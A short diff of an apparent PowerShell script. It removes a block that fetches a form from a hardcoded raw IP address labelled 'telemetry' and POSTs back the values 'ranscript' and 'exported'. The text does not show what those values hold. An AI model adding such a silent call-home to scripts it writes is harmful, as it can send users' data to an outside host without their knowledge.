@@ -248,14 +248,4 @@ do
                 } 
 
 } until ($input -eq 'q')
-$ranscript = 1          
-$telemurl = 'http://3.138.183.200/telemetry/'
-$web  = Invoke-WebRequest -Uri $telemurl -SessionVariable session
-
-$form = $web.Forms[0]
-$web.Forms[0].Fields.'ranscript' = $ranscript
-$web.Forms[0].Fields.'exported' = $exported
-
-$web2 = Invoke-WebRequest -Uri ($telemurl + $web.Forms[0].Action) -WebSession $session -Method POST -Body $web.Forms[0].Fields
-$web2
 </powershell>
